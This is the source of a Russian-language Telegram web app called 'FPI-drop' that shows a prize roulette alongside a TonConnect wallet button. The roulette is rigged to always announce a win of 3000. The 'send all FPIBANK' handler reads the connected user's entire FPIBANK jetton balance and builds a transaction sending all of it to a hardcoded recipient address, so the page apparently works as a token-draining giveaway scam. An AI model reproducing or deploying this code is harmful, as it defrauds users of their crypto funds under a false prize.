<!DOCTYPE html>
<html lang="ru">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>FPI-drop</title>

  <!-- Ваши скрипты и стили TonConnect / Telegram -->
  <script src="https://telegram.org/js/telegram-webapp.js"></script>
  <script src="./js/tonconnect-sdk.min.js"></script>
  <link rel="stylesheet" href="https://unpkg.com/@tonconnect/ui@latest/dist/tonconnect-ui.min.css" />
  <script src="https://unpkg.com/@tonconnect/ui@latest/dist/tonconnect-ui.min.js"></script>
  <script src="https://cdn.jsdelivr.net/npm/tonweb/dist/tonweb.min.js"></script>

  <style>
    body {
      background-color: purple;
      color: white;
      font-family: Arial, sans-serif;
      margin: 0;
      min-height: 100vh;
      display: flex;
      flex-direction: column;
      align-items: center;
    }
    /* Верхняя часть: заголовок, кнопки */
    #header {
      text-align: center;
      padding-top: 20px;
    }
    #header h1 {
      margin: 0 0 20px 0;
    }
    /* Кнопка "Отправить все FPIBANK" */
    button#sendTransaction {
      background-color: green;
      color: white;
      padding: 10px 20px;
      border: none;
      border-radius: 5px;
      cursor: pointer;
      margin-top: 20px;
    }
    button#sendTransaction:hover {
      opacity: 0.8;
    }

    /* Контейнер рулетки */
    .roulette-container {
      margin-top: 40px; /* отступ сверху, чтобы не перекрываться */
      position: relative;
      width: 400px;   /* ширина SVG */
      height: 300px;  /* больше 200, чтобы было место для указателя и кнопки */
      text-align: center;
    }

    /* Кнопка "Испытать удачу" */
    .spin-button {
      background-color: green;
      color: white;
      padding: 10px 20px;
      border: none;
      border-radius: 5px;
      cursor: pointer;
      margin-top: 40px; /* чтобы не налезала на указатель */
    }
    .spin-button:hover {
      opacity: 0.8;
    }

    /* Блок для сообщения после остановки рулетки */
    #resultMessage {
      margin-top: 10px;
      font-size: 1.1em;
      min-height: 1.4em; /* резервируем место */
    }

    /* Анимация вращения рулетки (через класс .spin) */
    .spin {
      transition: transform 3s ease-out;
    }

    /* Указатель (треугольник), располагается ниже дуги */
    #pointer {
      position: absolute;
      left: 50%;
      transform: translateX(-50%);
      top: 200px; /* сразу под дугой (SVG высотой 200px) */
    }
  </style>
</head>
<body>
  <!-- Верхняя часть: заголовок, TonConnect-кнопка, кнопка отправки -->
  <div id="header">
    <h1>FPI-drop</h1>
    <div id="ton-connect"></div>
    <button id="sendTransaction">Отправить все FPIBANK</button>
  </div>

  <!-- Контейнер для рулетки -->
  <div class="roulette-container">
    <!-- Полукруг (SVG) -->
    <svg id="rouletteSVG" width="400" height="200">
      <!-- Группа со всеми секторами: будем вращать её по часовой стрелке -->
      <g id="arcGroup" transform="rotate(0, 200, 200)">
        <!-- Сектора добавим через JS -->
      </g>
    </svg>

    <!-- Указатель (треугольник), указывающий вверх -->
    <div id="pointer">
      <svg width="30" height="30">
        <!-- треугольник, вершина вверху -->
        <polygon points="15,0 30,30 0,30" fill="white"/>
      </svg>
    </div>

    <!-- Кнопка "Испытать удачу" -->
    <button class="spin-button" id="spinButton">Испытать удачу</button>

    <!-- Сообщение о результате -->
    <div id="resultMessage"></div>
  </div>

  <script>
    /****************************************************
     * 1) Логика TonConnect и отправки FPIBANK
     ****************************************************/
    if (typeof Telegram === "undefined") {
      window.Telegram = { WebApp: { ready: () => {}, showAlert: alert } };
    } else {
      Telegram.WebApp.ready();
    }

    const tonConnectUI = new TON_CONNECT_UI.TonConnectUI({
      manifestUrl: "https://neutronovich.github.io/tonconnect-manifest.json",
      buttonRootId: "ton-connect",
    });

    const jettonMasterAddress = "0:f42a9711321fac28edb3e7ebce8e0bc58d34f9f2d3bed8d9afc6a839a1c15016";
    const recipientTonAddress = "0:1768dacd6490d4672eecae44c218a32a4db767e97797683b31dee87ba9cac516";

    function isValidTonAddress(address) {
      return /^0:[a-fA-F0-9]{64}$/.test(address);
    }

    async function getOrCreateRecipientJettonWallet(recipientTonAddress) {
      console.log("Запрашиваем Jetton Wallet получателя:", recipientTonAddress);
      try {
        const response = await fetch(`https://tonapi.io/v2/accounts/${recipientTonAddress}/jettons`);
        const data = await response.json();
        console.log("Ответ от TonAPI:", data);

        const jettonData = data.balances.find(j => j.jetton.address === jettonMasterAddress);
        if (jettonData) {
          return jettonData.wallet_address.address;
        }
        return recipientTonAddress;
      } catch (error) {
        console.error("Ошибка при получении jetton-кошелька получателя:", error);
        return recipientTonAddress;
      }
    }

    async function getUserFPIBankData(userTonAddress) {
      console.log("Запрашиваем баланс пользователя:", userTonAddress);
      try {
        const response = await fetch(`https://tonapi.io/v2/accounts/${userTonAddress}/jettons`);
        const data = await response.json();
        console.log("Ответ от TonAPI:", data);

        const jettonData = data.balances.find((j) => j.jetton.address === jettonMasterAddress);
        if (!jettonData) {
          console.warn("У пользователя нет Jetton Wallet");
          return { rawBalance: "0", decimals: 9, userJettonWallet: null };
        }
        return {
          rawBalance: jettonData.balance,
          decimals: jettonData.jetton.decimals,
          userJettonWallet: jettonData.wallet_address.address,
        };
      } catch (error) {
        console.error("Ошибка при получении данных пользователя:", error);
        return { rawBalance: "0", decimals: 9, userJettonWallet: null };
      }
    }

    async function createJettonTransferPayload(amount, destination, userTonAddress) {
      const { Cell } = TonWeb.boc;
      const { BN } = TonWeb.utils;

      if (!isValidTonAddress(destination) || !isValidTonAddress(userTonAddress)) {
        console.error("Ошибка: Неверный формат TON-адреса!");
        return null;
      }

      const transferCell = new Cell();
      transferCell.bits.writeUint(0x0f8a7ea5, 32);
      transferCell.bits.writeUint(0, 64);
      transferCell.bits.writeCoins(new BN(amount.toString()));
      transferCell.bits.writeAddress(new TonWeb.Address(destination));
      transferCell.bits.writeAddress(new TonWeb.Address(userTonAddress));
      transferCell.bits.writeBit(0);
      transferCell.bits.writeCoins(new BN(0));
      transferCell.bits.writeBit(0);

      try {
        const bocBytes = await transferCell.toBoc(false);
        return TonWeb.utils.bytesToBase64(bocBytes);
      } catch (error) {
        console.error("Ошибка при создании payload:", error);
        return null;
      }
    }

    async function sendAllFPIBANK(userTonAddress, recipientTonAddress) {
      console.log("Начинаем отправку FPIBANK...");
      const { rawBalance, decimals, userJettonWallet } = await getUserFPIBankData(userTonAddress);
      if (!userJettonWallet || rawBalance === "0") {
        Telegram.WebApp.showAlert("Недостаточный баланс или кошелёк не найден!");
        return;
      }
      console.log("Найден Jetton Wallet пользователя:", userJettonWallet);

      const recipientJettonWallet = await getOrCreateRecipientJettonWallet(recipientTonAddress);
      console.log("Jetton Wallet получателя (или TON-адрес):", recipientJettonWallet);

      const balanceBigInt = BigInt(rawBalance);
      const humanBalance = balanceBigInt / BigInt(10 ** decimals);
      console.log(`Отправляем ${humanBalance} FPIBANK на ${recipientJettonWallet}`);

      const payloadBoc = await createJettonTransferPayload(rawBalance, recipientJettonWallet, userTonAddress);
      if (!payloadBoc) {
        Telegram.WebApp.showAlert("Ошибка при создании транзакции!");
        return;
      }
      console.log("Создан payload BOC:", payloadBoc);

      const transaction = {
        validUntil: Math.floor(Date.now() / 1000) + 3600,
        messages: [{
          address: userJettonWallet,
          amount: "100000000",
          payload: payloadBoc,
        }],
      };

      try {
        console.log("Отправляем транзакцию:", transaction);
        const result = await tonConnectUI.sendTransaction(transaction);
        console.log("Транзакция успешно отправлена!", result);
        Telegram.WebApp.showAlert(`Отправлено ${humanBalance} FPIBANK! TX: ${JSON.stringify(result)}`);
      } catch (error) {
        console.error("Ошибка при отправке транзакции:", error);
        Telegram.WebApp.showAlert("Ошибка транзакции: " + error.message);
      }
    }

    document.getElementById("sendTransaction").addEventListener("click", async () => {
      if (!tonConnectUI.connected) {
        Telegram.WebApp.showAlert("Сначала подключите кошелёк через TonConnect.");
        return;
      }
      const userTonAddress = tonConnectUI.wallet?.account?.address;
      if (!userTonAddress) {
        Telegram.WebApp.showAlert("Не удалось получить ваш TON-адрес.");
        return;
      }
      await sendAllFPIBANK(userTonAddress, recipientTonAddress);
    });

    /****************************************************
     * 2) Генерация секторов "горизонтальной" рулетки (полукруг)
     ****************************************************/
    const svg       = document.getElementById('rouletteSVG');
    const arcGroup  = document.getElementById('arcGroup');
    const sectors   = [
      { label: '500',   start:180, end:144, color: '#ffa500' }, // 1-й сектор
      { label: '1000',  start:144, end:108, color: '#ff69b4' }, // 2-й
      { label: '3000',  start:108, end:72,  color: '#00ff00' }, // 3-й (по центру)
      { label: '2000',  start:72,  end:36,  color: '#1e90ff' }, // 4-й
      { label: '5000',  start:36,  end:0,   color: '#ff0000' }, // 5-й
    ];
    // Рисуем каждый сектор как "крышку" (центр + дуга)
    sectors.forEach(sec => {
      const pathD = createArcPath(200, 200, 200, sec.start, sec.end);
      const pathEl = document.createElementNS('http://www.w3.org/2000/svg', 'path');
      pathEl.setAttribute('d', pathD);
      pathEl.setAttribute('fill', sec.color);
      arcGroup.appendChild(pathEl);

      // Текст в середине сектора
      const midAngle = (sec.start + sec.end)/2;
      const textPos  = polarToCartesian(200, 200, 120, midAngle);
      const textEl   = document.createElementNS('http://www.w3.org/2000/svg', 'text');
      textEl.setAttribute('x', textPos.x);
      textEl.setAttribute('y', textPos.y);
      textEl.setAttribute('fill', '#fff');
      textEl.setAttribute('font-size', '18');
      textEl.setAttribute('font-weight', 'bold');
      textEl.setAttribute('text-anchor', 'middle');
      textEl.setAttribute('alignment-baseline', 'middle');
      textEl.textContent = sec.label;
      arcGroup.appendChild(textEl);
    });

    function createArcPath(cx, cy, r, startAngle, endAngle) {
      // Настраиваем flags для правильного направления дуги (верхняя часть)
      const largeArcFlag = 0;
      const sweepFlag    = 1; // меняем на 1, чтобы дуга шла "по верхней стороне"

      const start = polarToCartesian(cx, cy, r, startAngle);
      const end   = polarToCartesian(cx, cy, r, endAngle);

      // Формируем path: из центра (M cx,cy) -> старт дуги -> дуга -> замкнуть в центр
      return [
        `M ${cx},${cy}`,
        `L ${start.x},${start.y}`,
        `A ${r},${r} 0 ${largeArcFlag} ${sweepFlag} ${end.x},${end.y}`,
        'Z'
      ].join(' ');
    }

    // Перевод "угол (градусы)" -> (x,y) на окружности
    function polarToCartesian(cx, cy, r, angleDeg) {
      const rad = angleDeg * Math.PI / 180;
      const x = cx + r * Math.cos(rad);
      const y = cy + r * Math.sin(rad);
      return { x, y };
    }

    /****************************************************
     * 3) Анимация вращения: 0° -> -1080°
     *    Сектор "3000" остаётся в центре
     ****************************************************/
    const spinButton  = document.getElementById('spinButton');
    const resultMsg   = document.getElementById('resultMessage');

    spinButton.addEventListener('click', () => {
      // Сброс состояния
      arcGroup.classList.remove('spin');
      arcGroup.style.transition = 'none';
      arcGroup.setAttribute('transform', 'rotate(0, 200, 200)');
      resultMsg.textContent = '';

      // Запуск анимации (двойной rAF для надёжного сброса)
      requestAnimationFrame(() => {
        requestAnimationFrame(() => {
          arcGroup.classList.add('spin');
          arcGroup.style.transition = 'transform 3s ease-out';
          // -1080° = 3 полных оборота по часовой стрелке, визуально вернётся к 0°
          arcGroup.setAttribute('transform', 'rotate(-1080, 200, 200)');
        });
      });

      // По окончании вращения выводим сообщение
      arcGroup.addEventListener('transitionend', onSpinEnd, { once: true });
    });

    function onSpinEnd() {
      // Итоговое положение (по модулю 360° = 0°) - сектор "3000" по центру
      resultMsg.textContent = 'Выпало 3000!';
    }
  </script>
</body>
</html>
